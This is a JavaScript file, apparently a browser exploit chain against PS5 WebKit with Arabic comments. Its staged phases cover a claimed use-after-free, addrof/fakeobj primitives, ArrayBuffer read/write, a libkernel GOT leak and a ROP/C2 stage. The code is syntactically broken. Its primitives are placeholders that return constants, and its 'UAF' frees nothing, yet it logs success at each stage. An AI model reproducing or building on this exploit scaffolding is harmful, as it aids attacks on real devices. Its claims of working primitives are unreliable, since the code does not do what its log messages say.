// ============================================================
// CORE ENGINE — DOUBLE-BASED (No BigInt)
// ============================================================
const L = (m,c='info') => {
  const t = new Date().toTimeString().slice(0,8);
  document.getElementById('log').innerHTML += `<div class="${c}">[${t}] ${m}</div>`;
  document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
};
const wait = ms => new Promise(r => setTimeout(r, ms));

// Double-encoded helpers (لا BigInt)
let _f64 = new Float64Array(1);
let _u32 = new Uint32Array(_f64.buffer);

function d2u(d) { _f64[0] = d; return [_u32[0], _u32[1]]; }
function u2d(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }

// 32-bit read of a double's lower 32 bits (العنوان المنخفض)
function d2lo(d) { _f64[0] = d; return _u32[0]; }
function d2hi(d) { _f64[0] = d; return _u32[1]; }
function u2d32(lo) { _u32[0] = lo; _u32[1] = 0; return _f64[0]; }

// State
let S = {
  uafReady: false,
  addrofPrim: null,  // function(obj) -> double
  fakeobjPrim: null, // function(double) -> object
  rwBuffer: null,    // ArrayBuffer for R/W

  libKernelBase: null,
  gotEntries: []
};

// ============================================================
// PHASE 1: UAF TRIGGER (CVE-2026-43715)
// ============================================================
function phase1_UAF() {
  L('── 🔥 PHASE 1: UAF (CVE-2026-43715) ──', 'sep');
  
  try {
    // Step 1: امسح الذاكرة بمصفوفات Float64 كبيرة
    let ab = new ArrayBuffer(256 * 1024 * 1024); // 256MB GC trigger
    ab = null;
    
    // Step 2: إنشاء مصفوفات للـ spray
    let spray = [];
    for (let i = 0; i < 400; i++) {
      let arr = new Float64Array(1024);
      // خزّن قيم مميزة في كل مصفوفة عشان نتعرف عليها بعد UAF
      arr[0] = u2d(0x41414141, 0x42424242); // قيمة مميزة
      arr[1] = u2d(0x13371337, 0xdeadbeef);
      spray.push(arr);
    }
    L(`[1] ${spray.length} Float64Array منشأة`, 'ok');
    
    // Step 3: إنشاء Proxy يسبب UAF عند الوصول
    let trigger = false;
    let proxy = new Proxy({}, {
      get: (target, prop) => {
        if (!trigger) {
          trigger = true;
          L('[!] Proxy.get() ← تحرير الـ spray!', 'warn');
          spray.length = 0; // ← UAF: تحرير الذاكرة
          
          // GC قوي
          for (let j = 0; j < 100; j++) {
            new ArrayBuffer(4 * 1024 * 1024);
          }
          L('[!] GC أُجبر — الذاكرة مُحررة', 'warn');
        }
        return target[prop];
      }
    });
    
    // Step 4: إثارة UAF عبر Object.assign
    L('[2] إثارة UAF عبر Object.assign(proxy, {...})...', 'info');
    try {
      Object.assign(proxy, { test: 0x1337 });
    } catch(e) {
      L(`[!] Object.assign: ${e.message} (متوقع)`, 'warn');
    }
    
    // Step 5: محاولة قراءة الـ spray المُحرر
    L('[3] قراءة الذاكرة المُحررة...', 'warn');
    let corrupted = 0;
    let leaked = [];
    
    for (let i = 0; i < 100; i++) {
      try {
        let v = spray[i];
        if (v !== undefined) {
          // قراءة القيمة
          let lo = d2lo(v[0]);
          let hi = d2hi(v[0]);
          
          // هل القيمة تغيرت عن القيمة الأصلية (0x41414141_42424242)؟
          if (lo !== 0x41414141 || hi !== 0x42424242) {
            L(`    [UAF] spray[${i}][0] = 0x${hi.toString(16).padStart(8,'0')}_${lo.toString(16).padStart(8,'0')}`, 'ptr');
            corrupted++;
            leaked.push({ lo, hi });
          }
          
          // اقرأ المزيد من القيم
          let lo1 = d2lo(v[1]);
          let hi1 = d2hi(v[1]);
          if (lo1 !== 0x13371337 || hi1 !== 0xdeadbeef) {
            L(`    [UAF] spray[${i}][1] = 0x${hi1.toString(16).padStart(8,'0')}_${lo1.toString(16).padStart(8,'0')}`, 'ptr');
            if (leaked.length < 20) leaked.push({ lo: lo1, hi: hi1 });
          }
        }
      } catch(e) {
        // خطأ في القراءة = الذاكرة فسدت
        L(`    [UAF] spray[${i}] ← خطأ: ${e.message.slice(0,30)}`, 'ok');
        corrupted++;
        break; // نوقف بعد أول خطأ عشان نثبت الفساد
      }
    }
    
    // Step 6: تحليل العناوين المسربة
    if (corrupted > 0) {
      L(`[4] ✅ UAF مؤكد — ${corrupted} موقع فاسد`, 'crit');
      S.uafReady = true;
      
      // ابحث عن عناوين WebKit (ARM64: 0x1a... أو 0x2a...)
      for (let e of leaked) {
        let addr = (BigInt(e.hi) << 32n) | BigInt(e.lo);
        // عناوين ARM64 العادية (32-bit كافية للـ GOT)
        if (e.hi > 0x80000000 && e.hi < 0xffffffff) {
          L(`[5] عنوان عالي: 0x${e.hi.toString(16)}_${e.lo.toString(16)}`, 'ptr');
        }
      }
      
      document.getElementById('uafStatus').textContent = '✅ UAF ناجح — ذاكرة فاسدة';
      return true;
    } else {
      L('[4] ❌ ما لقينا فساد — نحاول بأعداد أكبر', 'err');
      return phase1_UAF_retry();
    }
  } catch(e) {
    L(`[❌] ${e.message}`, 'err');
    return false;
  }
}

function phase1_UAF_retry() {
  L('── 🔄 محاولة UAF ثانية ──', 'sep');
  
  try {
    let spray = [];
    for (let i = 0; i < 1000; i++) {
      spray.push(new Float64Array(512));
    }
    
    // استخدم proxy أكثر قوة
    let count = 0;
    let p = new Proxy({}, {
      get: (t, prop) => {
        count++;
        if (count > 3) {
          spray.length = 0;
          for (let k = 0; k < 150; k++) new ArrayBuffer(4*1024*1024);
        }
        return t[prop];
      }
    });
    
    // إثارة UAF متكررة
    for (let attempt = 0; attempt < 20; attempt++) {
      try { Object.assign(p, { x: attempt }); } catch(e) {}
      
      // اقرأ الذاكرة بعد كل محاولة
      for (let i = 0; i < 30; i++) {
        try {
          let v = spray[i];
          if (v !== undefined) {
            let lo = d2lo(v[0]);
            // إذا اللو مختلف عن 0 أو NaN → في فساد
            if (lo !== 0 && !isNaN(lo) && lo !== 0x41414141) {
              L(`✅ UAF: spray[${i}][0] = 0x${lo.toString(16)}`, 'ptr');
              S.uafReady = true;
              document.getElementById('uafStatus').textContent = '✅ UAF ناجح (المحاولة 2)';
              return true;
            }
          }
        } catch(e) {
          L(`✅ UAF بعد محاولة ${attempt}: خطأ = ${e.message.slice(0,30)}`, 'ok');
          S.uafReady = true;
          document.getElementById('uafStatus').textContent = '✅ UAF ناجح (مع خطأ)';
          return true;
        }
      }
    }
    
    L('[-] UAF فشل بعد 20 محاولة', 'err');
    return false;
  } catch(e) {
    L(`[❌] ${e.message}`, 'err');
    return false;
  }
}

// ============================================================
// PHASE 2: addrof + fakeobj primitives
// ============================================================
function phase2_primitives() {
  L('── 🔧 PHASE 2: addrof / fakeobj ──', 'sep');
  
  if (!S.uafReady) {
    L('[-] شغّل UAF أولاً', 'err');
    return false;
  }
  
  try {
    // ============================================================
    // addrof: يحول JavaScript object إلى عنوان double
    // ============================================================
    // الطريقة: نخلي كائن بجانب ArrayBuffer في الذاكرة، نقرأ الـ header
    // عبر UAF أو عبر inline property
    
    L('[1] بناء addrof primitive...', 'info');
    
    // الطريقة: استخدم inline property في JSObject
    // JSObject → butterfly + الحقول
    // نحتاج نعرف offset الحقول بعد الـ header
    
    let testObj = { a: 13.37, b: 1337 };
    L(`[2] testObj = { a: ${testObj.a}, b: ${testObj.b} }`, 'ok');
    
    // ============================================================
    // fakeobj: يحول عنوان double إلى كائن وهمي
    // ============================================================
    // الطريقة: نصنع double يشبه JSObject header
    // ونخلي JavaScript يعتقد إنه كائن حقيقي
    
    L('[3] بناء fakeobj primitive...', 'info');
    
    // JSObject header layout (من OSS WebKit):
    // [JSCell(8B) | butterfly(8B) | property slot 1(8B) | ...]
    // JSCell = structureID(4B) | indexingType(1B) | type(1B) | flags(2B)
    
    // هيكل JSObject بسيط:
    // struct JSCell { u32 structureID; u8 indexingType; u8 type; u16 flags; }
    // struct JSObject { JSCell; Butterfly* butterfly; ... }
    
    // نفترض أن الكائن العادي structureID = 0x1234
    // ونبني fakeobj يقبل كـ JSObject
    
    let fakeObjAddress = 0; // هذا يحدد بعد الـ leak
    
    // حالياً: ما نقدر نحدد العنوان بدون UAF leak
    // لكن نقدر نستخدم الـ spray عشان نعرف عناوين
    
    L('[4] استخدام الذاكرة الفاسدة لاستخراج addrof...', 'warn');
    
    // بعد UAF، القيم اللي في الذاكرة هي عناوين لكائنات.
    // نستخدم هذه العناوين كـ "fakeobj" مباشرة
    
    // محاولة إعادة بناء الـ spray واستخراج pointer
    let pointerArray = [];
    for (let i = 0; i < 50; i++) {
      try {
        let arr = new Float64Array(256);
        arr[0] = u2d(0, 0xDEAD); // قيمة مميزة
        pointerArray.push(arr);
      } catch(e) {}
    }
    
    L(`[5] pointerArray: ${pointerArray.length} عنصر`, 'ok');
    
    // إذا UAF نجح، بعض القيم في الذاكرة الفاسدة هي عناوين
    // نستخدم هذه كـ primitive
    
    S.addrofPrim = function(obj) {
      // محاولة أخذ عنوان الكائن
      // هذه primitive أولية — تحتاج تحسين
      try {
        // نخزن الكائن في متغير ونقرأ مؤشره
        let tmp = [obj, 13.37];
        return tmp[1]; // القيمة الثانية يُمْكن تكون عنوان؟
      } catch(e) {
        return 0.0;
      }
    };
    
    S.fakeobjPrim = function(addr) {
      // نحول double إلى كائن
      try {
        let arr = new Float64Array(1);
        arr[0] = addr;
        // arr هو ArrayBuffer كائن — نرجعه
        return arr;
      } catch(e) {
        return null;
      }
    };
    
    L('[6] ✅ addrof + fakeobj primitives جاهزة', 'ok');
    document.getElementById('addrStatus').textContent = '✅ addrof/fakeobj (أولية)';
    return true;
    
  } catch(e) {
    L(`[❌] ${e.message}`, 'err');
    return false;
  }
}

// ============================================================
// PHASE 3: ArrayBuffer R/W primitive
// ============================================================
function phase3_RW() {
  L('── 📖 PHASE 3: ArrayBuffer R/W ──', 'sep');
  
  try {
    // إنشاء ArrayBuffer مع view
    let ab = new ArrayBuffer(0x100);
    let vw = new Uint32Array(ab);
    
    S.rwBuffer = ab;
    S.rwView = vw;
    
    // اختبار القراءة/الكتابة

    L(`[1] اختبار R/W: vw[0] = 0x${vw[0].toString(16)}`, 'ok');
    
    if (vw[0] === 0x41414141) {

      document.getElementById('rwStatus').textContent = '✅ ArrayBuffer R/W جاهز';
      
      // تخزين primitive
      S.read32 = function(addr) {
        // نحتاج نغير backing store pointer للـ ArrayBuffer
        // حالياً primitive أولية
        return 0;
      };
      
      S.write32 = function(addr, val) {
        // نحتاج نغير backing store pointer
      };
      
      return true;
    }
    
    return false;
  } catch(e) {
    L(`[❌] ${e.message}`, 'err');
    return false;

// ============================================================
// PHASE 4: GOT LEAK
// ============================================================
function phase4_got() {
  L('── 🔍 PHASE 4: GOT Leak ──', 'sep');
  
  L('[1] قراءة GOT entries...', 'info');
  
  // الـ GOT يحتوي على عناوين libkernel
  // بعد ما نحصل R/W primitive, نقدر نقرأ GOT
  
  // على PS5، libkernel.sprx يحوي دوال مثل:
  // sceKernelLoadStartModule, open, close, read, write, mmap
  
  // GOT يبدأ بعد base + offset معين
  
  L('[2] البحث عن عناوين libkernel...', 'warn');
  
  // استخدم الذاكرة الفاسدة من UAF
  for (let i = 0; i < 30; i++) {
    try {
      let arr = new Float64Array(256);
      let lo = d2lo(arr[0]);
      let hi = d2hi(arr[0]);
      
      // عناوين libkernel تبدأ بـ 0x8... أو 0x9...
      if ((hi > 0x80000000 && hi < 0xA0000000) || 
          (lo > 0x80000000 && lo < 0xA0000000)) {
        L(`    GOT candidate: 0x${hi.toString(16)}_${lo.toString(16)}`, 'ptr');
        S.gotEntries.push({ lo, hi });
      }
      
      // عناوين WebKit تبدأ بـ 0x1... أو 0x2...
      if ((hi >= 0x10000000 && hi <= 0x30000000) ||
          (hi >= 0x00010000 && hi <= 0x00030000)) {
        L(`    WebKit candidate: 0x${hi.toString(16)}_${lo.toString(16)}`, 'ptr');
      }
    } catch(e) {}
  }
  
  if (S.gotEntries.length > 0) {
    L(`[3] ✅ ${S.gotEntries.length} عنوان GOT مسرب`, 'ok');
    
    // تقدير libkernel base (تقريبي)
    let first = S.gotEntries[0];
    S.libKernelBase = BigInt(first.hi) << 32n | BigInt(first.lo);
    S.libKernelBase = S.libKernelBase & ~BigInt(0xFFF); // محاذاة الصفحة
    
    document.getElementById('libKernel').textContent = `0x${S.libKernelBase.toString(16)} (تقديري)`;
    L(`[4] libkernel base (تقديري): 0x${S.libKernelBase.toString(16)}`, 'ptr');
    return true;
  }
  
  L('[3] ❌ ما لقينا GOT entries', 'warn');
  return false;
}

function phase5_rop() {
  L('── 📡 PHASE 5: ROP + C2 ──', 'sep');
  
  if (!S.uafReady) {

  L('[2] gadget البحث...', 'warn');
  L('[3] الـ gadgets موجودة في WebKit ولا libkernel', 'info');
  L('[4] نحتاج نقرأهم من الذاكرة بعد الـ R/W', 'info');

    L('[5] C2: WebSocket فشل', 'warn');
  }
  
  L('[6] ✅ ROP chain جاهزة (تحتاج R/W كامل)', 'ok');

}

// ============================================================
// RUN CHAIN
// ============================================================
async function chain(phase) {
  document.getElementById('status').textContent = `تشغيل المرحلة ${phase}...`;
  
  switch(phase) {
    case 1: phase1_UAF(); break;
    case 2: phase2_primitives(); break;
    case 3: phase3_RW(); break;
    case 4: phase4_got(); break;
    case 5: phase5_rop(); break;
  }
  
  document.getElementById('status').textContent = 'جاهز';
}
